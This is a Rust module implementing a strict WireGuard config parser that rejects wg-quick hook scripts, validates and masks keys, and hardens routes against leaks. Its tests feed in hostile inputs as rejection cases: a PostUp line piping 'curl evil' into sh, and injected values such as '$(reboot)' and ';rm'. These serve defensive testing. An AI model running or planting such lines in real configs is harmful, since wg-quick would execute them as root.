//! Strict WireGuard config parser shared by the app and the privileged helper.
//!
//! Configs are parsed into typed fields and re-rendered, so nothing the user
//! wrote reaches wg-quick / wireguard.exe verbatim. Hooks (PostUp etc.) are
//! rejected because wg-quick runs them as root through bash.
//! Error messages never contain field values, so private keys can't leak.

use std::net::IpAddr;

pub const MAX_CONFIG_BYTES: usize = 64 * 1024;
const MAX_PEERS: usize = 256;
/// Firewall mark (and routing table) used for the tunnel's own UDP packets on Linux.
pub const FWMARK: u32 = 51820;

#[derive(Debug, Clone, PartialEq, Default)]
pub struct Interface {
    pub private_key: String,
    pub addresses: Vec<String>,
    pub dns: Vec<String>,
    pub mtu: Option<u16>,
    pub listen_port: Option<u16>,
}

#[derive(Debug, Clone, PartialEq, Default)]
pub struct Peer {
    pub public_key: String,
    pub preshared_key: Option<String>,
    pub allowed_ips: Vec<String>,
    pub endpoint: Option<String>,
    pub persistent_keepalive: Option<u16>,
}

#[derive(Debug, Clone, PartialEq)]
pub struct Config {
    pub interface: Interface,
    pub peers: Vec<Peer>,
}

enum Section {
    None,
    Interface,
    Peer,
}

pub fn parse(text: &str) -> Result<Config, String> {
    if text.len() > MAX_CONFIG_BYTES {
        return Err("config is larger than 64 KiB".into());
    }
    let mut iface: Option<Interface> = None;
    let mut peers: Vec<Peer> = Vec::new();
    let mut section = Section::None;

    for (n, raw) in text.lines().enumerate() {
        let line_no = n + 1;
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        let err = |msg: &str| format!("line {line_no}: {msg}");

        if line.starts_with('[') {
            section = match line.to_ascii_lowercase().as_str() {
                "[interface]" => {
                    if iface.is_some() {
                        return Err(err("duplicate [Interface] section"));
                    }
                    iface = Some(Interface::default());
                    Section::Interface
                }
                "[peer]" => {
                    if peers.len() >= MAX_PEERS {
                        return Err(err("too many peers"));
                    }
                    peers.push(Peer::default());
                    Section::Peer
                }
                _ => return Err(err("unknown section")),
            };
            continue;
        }

        let (key, value) = line.split_once('=').ok_or_else(|| err("expected Key = Value"))?;
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();
        if value.chars().any(|c| c.is_control()) {
            return Err(err("control characters are not allowed"));
        }

        match section {
            Section::None => return Err(err("setting outside of a section")),
            Section::Interface => {
                let i = iface.as_mut().unwrap();
                match key.as_str() {
                    "privatekey" => i.private_key = key_value(value).map_err(|e| err(e))?,
                    "address" => i.addresses.extend(list(value, cidr).map_err(|e| err(&e))?),
                    "dns" => i.dns.extend(list(value, dns_entry).map_err(|e| err(&e))?),
                    "mtu" => i.mtu = Some(number(value, 576, 9000).map_err(|e| err(e))?),
                    "listenport" => i.listen_port = Some(number(value, 1, 65535).map_err(|e| err(e))?),
                    "preup" | "postup" | "predown" | "postdown" => {
                        return Err(err("PreUp/PostUp/PreDown/PostDown scripts are not allowed"))
                    }
                    _ => return Err(err(&unknown(&key))),
                }
            }
            Section::Peer => {
                let p = peers.last_mut().unwrap();
                match key.as_str() {
                    "publickey" => p.public_key = key_value(value).map_err(|e| err(e))?,
                    "presharedkey" => p.preshared_key = Some(key_value(value).map_err(|e| err(e))?),
                    "allowedips" => p.allowed_ips.extend(list(value, network).map_err(|e| err(&e))?),
                    "endpoint" => p.endpoint = Some(endpoint(value).map_err(|e| err(e))?),
                    "persistentkeepalive" => {
                        p.persistent_keepalive = Some(number(value, 0, 65535).map_err(|e| err(e))?)
                    }
                    _ => return Err(err(&unknown(&key))),
                }
            }
        }
    }

    let interface = iface.ok_or("missing [Interface] section")?;
    if interface.private_key.is_empty() {
        return Err("[Interface] is missing PrivateKey".into());
    }
    if interface.addresses.is_empty() {
        return Err("[Interface] is missing Address".into());
    }
    if peers.is_empty() {
        return Err("at least one [Peer] is required".into());
    }
    for (n, p) in peers.iter().enumerate() {
        if p.public_key.is_empty() {
            return Err(format!("peer {} is missing PublicKey", n + 1));
        }
    }
    Ok(Config { interface, peers })
}

fn unknown(key: &str) -> String {
    if key.chars().all(|c| c.is_ascii_alphanumeric()) && key.len() < 32 {
        format!("unsupported setting '{key}'")
    } else {
        "unsupported setting".into()
    }
}

fn key_value(v: &str) -> Result<String, &'static str> {
    // 32 bytes of standard base64 = 43 chars + one '=' pad.
    let ok = v.len() == 44
        && v.ends_with('=')
        && v.as_bytes()[..43].iter().copied().all(|b| b.is_ascii_alphanumeric() || b == b'+' || b == b'/')
        && b"AEIMQUYcgkosw048".contains(&v.as_bytes()[42]);
    if ok { Ok(v.to_string()) } else { Err("invalid key (expected 44-char base64)") }
}

fn number(v: &str, min: u16, max: u16) -> Result<u16, &'static str> {
    match v.parse::<u16>() {
        Ok(n) if n >= min && n <= max => Ok(n),
        _ => Err("number out of range"),
    }
}

fn list(v: &str, f: fn(&str) -> Result<String, &'static str>) -> Result<Vec<String>, String> {
    v.split(',').map(str::trim).filter(|s| !s.is_empty()).map(|s| f(s).map_err(String::from)).collect()
}

fn cidr(v: &str) -> Result<String, &'static str> {
    let (ip, prefix) = match v.split_once('/') {
        Some((ip, p)) => (ip, Some(p)),
        None => (v, None),
    };
    let ip: IpAddr = ip.parse().map_err(|_| "invalid IP address")?;
    let max = if ip.is_ipv4() { 32 } else { 128 };
    match prefix {
        None => Ok(ip.to_string()),
        Some(p) => match p.parse::<u8>() {
            Ok(p) if p <= max => Ok(format!("{ip}/{p}")),
            _ => Err("invalid prefix length"),
        },
    }
}

fn network(v: &str) -> Result<String, &'static str> {
    let value = cidr(v)?;
    let (address, prefix) = value.split_once('/').unwrap_or((&value, ""));
    let ip: IpAddr = address.parse().map_err(|_| "invalid IP address")?;
    let prefix: u32 = if prefix.is_empty() {
        if ip.is_ipv4() { 32 } else { 128 }
    } else {
        prefix.parse().map_err(|_| "invalid prefix length")?
    };
    let address = match ip {
        IpAddr::V4(ip) => IpAddr::V4((u32::from(ip) & u32::MAX.checked_shl(32 - prefix).unwrap_or(0)).into()),
        IpAddr::V6(ip) => IpAddr::V6((u128::from(ip) & u128::MAX.checked_shl(128 - prefix).unwrap_or(0)).into()),
    };
    Ok(format!("{address}/{prefix}"))
}

fn hostname(v: &str) -> bool {
    !v.is_empty()
        && v.len() <= 253
        && !v.starts_with(['-', '.'])
        && v.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'.')
}

fn dns_entry(v: &str) -> Result<String, &'static str> {
    if let Ok(ip) = v.parse::<IpAddr>() {
        return Ok(ip.to_string());
    }
    // wg-quick treats non-IP DNS entries as search domains.
    if hostname(v) { Ok(v.to_string()) } else { Err("invalid DNS server or search domain") }
}

fn endpoint(v: &str) -> Result<String, &'static str> {
    let (host, port) = v.rsplit_once(':').ok_or("endpoint must be host:port")?;
    number(port, 1, 65535).map_err(|_| "invalid endpoint port")?;
    let ok = if let Some(inner) = host.strip_prefix('[').and_then(|h| h.strip_suffix(']')) {
        inner.parse::<std::net::Ipv6Addr>().is_ok()
    } else {
        hostname(host)
    };
    if ok { Ok(v.to_string()) } else { Err("invalid endpoint host") }
}

fn is_default(cidr: &str, v6: bool) -> bool {
    cidr == if v6 { "::/0" } else { "0.0.0.0/0" }
}

impl Config {
    /// True if some peer takes the IPv4 or IPv6 default route.
    pub fn full_tunnel(&self) -> bool {
        self.peers.iter().flat_map(|p| &p.allowed_ips).any(|c| is_default(c, false) || is_default(c, true))
    }

    pub fn endpoints(&self) -> Vec<String> {
        self.peers.iter().filter_map(|p| p.endpoint.clone()).collect()
    }

    /// Replace DNS servers (empty list keeps the profile's own).
    pub fn override_dns(&mut self, dns: &[String]) -> Result<(), String> {
        if dns.is_empty() {
            return Ok(());
        }
        self.interface.dns = dns.iter().map(|d| dns_entry(d.trim()).map_err(String::from)).collect::<Result<_, _>>()?;
        Ok(())
    }

    /// Leak hardening applied by the helper before bringing the tunnel up.
    /// - IPv4-only full tunnels also capture ::/0 so IPv6 can't bypass the VPN
    ///   (the server drops it, which is the intended "block IPv6" behaviour).
    /// - On Windows, WireGuard's built-in firewall kill switch engages for a
    ///   single peer with a /0 route; splitting /0 into two /1s turns it off.
    pub fn harden(&mut self, kill_switch: bool, windows: bool) {
        let all: Vec<&String> = self.peers.iter().flat_map(|p| &p.allowed_ips).collect();
        let has_v4 = all.iter().any(|c| is_default(c, false));
        let has_v6 = all.iter().any(|c| is_default(c, true));
        if has_v4 && !has_v6 {
            if let Some(p) = self.peers.iter_mut().find(|p| p.allowed_ips.iter().any(|c| is_default(c, false))) {
                p.allowed_ips.push("::/0".into());
            }
        }
        if windows && !kill_switch {
            for p in &mut self.peers {
                p.allowed_ips = p
                    .allowed_ips
                    .iter()
                    .flat_map(|c| match c.as_str() {
                        "0.0.0.0/0" => vec!["0.0.0.0/1".to_string(), "128.0.0.0/1".to_string()],
                        "::/0" => vec!["::/1".to_string(), "8000::/1".to_string()],
                        _ => vec![c.clone()],
                    })
                    .collect();
            }
        }
    }

    /// Canonical config text. `fwmark` is Linux-only (wireguard-windows rejects it).
    pub fn render(&self, fwmark: Option<u32>) -> String {
        let i = &self.interface;
        let mut s = String::from("[Interface]\n");
        s += &format!("PrivateKey = {}\n", i.private_key);
        s += &format!("Address = {}\n", i.addresses.join(", "));
        if !i.dns.is_empty() {
            s += &format!("DNS = {}\n", i.dns.join(", "));
        }
        if let Some(m) = i.mtu {
            s += &format!("MTU = {m}\n");
        }
        if let Some(p) = i.listen_port {
            s += &format!("ListenPort = {p}\n");
        }
        if let Some(m) = fwmark {
            s += &format!("FwMark = {m}\n");
        }
        for p in &self.peers {
            s += "\n[Peer]\n";
            s += &format!("PublicKey = {}\n", p.public_key);
            if let Some(k) = &p.preshared_key {
                s += &format!("PresharedKey = {k}\n");
            }
            if !p.allowed_ips.is_empty() {
                s += &format!("AllowedIPs = {}\n", p.allowed_ips.join(", "));
            }
            if let Some(e) = &p.endpoint {
                s += &format!("Endpoint = {e}\n");
            }
            if let Some(k) = p.persistent_keepalive {
                s += &format!("PersistentKeepalive = {k}\n");
            }
        }
        s
    }
}

/// Stands in for secret values shown in the editor, so keys never reach the UI.
pub const HIDDEN: &str = "[hidden]";

/// (lowercased key, value) of a PrivateKey/PresharedKey line.
fn secret(line: &str) -> Option<(String, &str)> {
    let (k, v) = line.split_once('=')?;
    let k = k.trim().to_ascii_lowercase();
    (k == "privatekey" || k == "presharedkey").then(|| (k, v.trim()))
}

pub fn mask(text: &str) -> String {
    text.lines()
        .map(|l| match (secret(l), l.split_once('=')) {
            (Some(_), Some((k, _))) => format!("{} = {HIDDEN}", k.trim()),
            _ => l.to_string(),
        })
        .collect::<Vec<_>>()
        .join("\n")
}

/// Put saved secrets back where the editor shows HIDDEN, matching peers by public key.
/// Peer identity keeps preshared keys attached when peers are removed or reordered.
pub fn unmask(text: &str, saved: &str) -> Result<String, String> {
    let saved = parse(saved)?;
    let mut peer_key = None;
    let mut section = None;
    let lines: Vec<&str> = text.lines().collect();
    let mut out = Vec::new();
    for (index, line) in lines.iter().enumerate() {
        let clean = line.split('#').next().unwrap_or("").trim();
        if clean.eq_ignore_ascii_case("[Interface]") {
            section = Some(false);
        } else if clean.eq_ignore_ascii_case("[Peer]") {
            section = Some(true);
            peer_key = lines[index + 1..].iter()
                .take_while(|l| !l.trim().starts_with('['))
                .find_map(|l| {
                    let (key, value) = l.split('#').next()?.split_once('=')?;
                    key.trim().eq_ignore_ascii_case("PublicKey").then(|| value.trim())
                });
        }
        let restored = match secret(clean) {
            Some((key, HIDDEN)) => {
                let value = match (section, key.as_str()) {
                    (Some(false), "privatekey") => Some(saved.interface.private_key.as_str()),
                    (Some(true), "presharedkey") => saved.peers.iter()
                        .find(|p| Some(p.public_key.as_str()) == peer_key)
                        .and_then(|p| p.preshared_key.as_deref()),
                    _ => None,
                }.ok_or("A hidden key has no saved value. Paste the key again.")?;
                format!("{} = {value}", line.split_once('=').unwrap().0.trim())
            }
            _ => line.to_string(),
        };
        out.push(restored);
    }
    Ok(out.join("\n"))
}

#[cfg(test)]
mod tests {
    use super::*;

    const KEY: &str = "yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=";
    const PUB: &str = "xTIBA5rboUvnH4htodjb6e697QjLERt1NAB4mZqp8Dg=";

    fn sample() -> String {
        format!(
            "# comment\n[Interface]\nPrivateKey = {KEY}\nAddress = 10.0.0.2/32, fd00::2/128\nDNS = 1.1.1.1\n\n\
             [Peer]\nPublicKey = {PUB}\nAllowedIPs = 0.0.0.0/0\nEndpoint = vpn.example.com:51820\nPersistentKeepalive = 25\n"
        )
    }

    #[test]
    fn parses_and_roundtrips() {
        let c = parse(&sample()).unwrap();
        assert_eq!(c.interface.addresses, ["10.0.0.2/32", "fd00::2/128"]);
        assert_eq!(c.endpoints(), ["vpn.example.com:51820"]);
        assert!(c.full_tunnel());
        assert_eq!(parse(&c.render(None)).unwrap(), c);
    }

    #[test]
    fn rejects_hooks_and_unknown_keys() {
        let hook = sample().replace("DNS = 1.1.1.1", "PostUp = curl evil | sh");
        assert!(parse(&hook).unwrap_err().contains("not allowed"));
        let table = sample().replace("DNS = 1.1.1.1", "Table = off");
        assert!(parse(&table).unwrap_err().contains("unsupported"));
    }

    #[test]
    fn rejects_bad_values_without_echoing_them() {
        let bad = sample().replace(KEY, "notakey");
        let e = parse(&bad).unwrap_err();
        assert!(e.contains("line 3") && !e.contains("notakey"));
        for (from, to) in [
            ("10.0.0.2/32", "10.0.0.2/33"),
            ("vpn.example.com:51820", "vpn.example.com"),
            ("vpn.example.com:51820", "$(reboot):1"),
            ("1.1.1.1", "1.1.1.1;rm"),
        ] {
            assert!(parse(&sample().replace(from, to)).is_err(), "{to}");
        }
        assert!(parse("[Interface]\nAddress = 10.0.0.2/32\n").is_err());
        assert!(parse(&format!("[Interface]\nPrivateKey = {KEY}\nAddress = 10.0.0.2\n")).is_err());
    }

    #[test]
    fn masking_roundtrip() {
        let text = sample().replace("[Peer]\n", &format!("[Peer]\nPresharedKey = {PUB}\n"));
        let shown = mask(&text);
        assert!(!shown.contains(KEY) && !shown.contains(&format!("PresharedKey = {PUB}")));
        assert_eq!(shown.matches(HIDDEN).count(), 2);
        assert_eq!(parse(&unmask(&shown, &text).unwrap()).unwrap(), parse(&text).unwrap());
        // An edited config keeps the hidden key and takes the new value.
        let edited = shown.replace("DNS = 1.1.1.1", "DNS = 9.9.9.9");
        assert_eq!(parse(&unmask(&edited, &text).unwrap()).unwrap().interface.dns, ["9.9.9.9"]);
        // A hidden key with nothing saved behind it is an error, not an empty key.
        assert!(unmask(&shown, "[Interface]\n").is_err());
    }

    #[test]
    fn rejects_noncanonical_base64_keys() {
        let invalid = format!("{}B=", "A".repeat(42));
        assert!(parse(&sample().replace(KEY, &invalid)).is_err());
    }

    #[test]
    fn rejects_unicode_key_without_panicking() {
        let key = format!("{}é=", "a".repeat(41));
        assert_eq!(key.len(), 44);
        assert!(parse(&sample().replace(KEY, &key)).is_err());
    }

    #[test]
    fn normalizes_default_routes_before_hardening() {
        let mut c = parse(&sample().replace("0.0.0.0/0", "192.0.2.1/0")).unwrap();
        assert!(c.full_tunnel());
        c.harden(true, false);
        assert_eq!(c.peers[0].allowed_ips, ["0.0.0.0/0", "::/0"]);
        assert_eq!(network("2001:db8::1/0").unwrap(), "::/0");
        assert_eq!(network("192.0.2.5/24").unwrap(), "192.0.2.0/24");
        assert_eq!(network("192.0.2.5").unwrap(), "192.0.2.5/32");
    }

    #[test]
    fn hidden_peer_keys_follow_public_key() {
        let first = sample().replace("[Peer]", &format!("[Peer]\nPresharedKey = {KEY}"));
        let saved = format!("{first}\n[Peer]\nPublicKey = {KEY}\nPresharedKey = {PUB}\nAllowedIPs = 10.0.0.0/8\n");
        let mut edited = parse(&saved).unwrap();
        edited.peers.remove(0);
        let restored = parse(&unmask(&mask(&edited.render(None)), &saved).unwrap()).unwrap();
        assert_eq!(restored.peers[0].preshared_key.as_deref(), Some(PUB));
        edited.peers[0].public_key = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".into();
        assert!(unmask(&mask(&edited.render(None)), &saved).is_err());
    }

    #[test]
    fn hardening() {
        let mut c = parse(&sample()).unwrap();
        c.harden(true, false);
        assert_eq!(c.peers[0].allowed_ips, ["0.0.0.0/0", "::/0"]);

        let mut w = parse(&sample()).unwrap();
        w.harden(false, true);
        assert_eq!(w.peers[0].allowed_ips, ["0.0.0.0/1", "128.0.0.0/1", "::/1", "8000::/1"]);

        let mut d = parse(&sample()).unwrap();
        d.override_dns(&["9.9.9.9".into()]).unwrap();
        assert_eq!(d.interface.dns, ["9.9.9.9"]);
        assert!(d.override_dns(&["bad;dns".into()]).is_err());
        assert!(c.render(Some(FWMARK)).contains("FwMark = 51820"));
    }
}
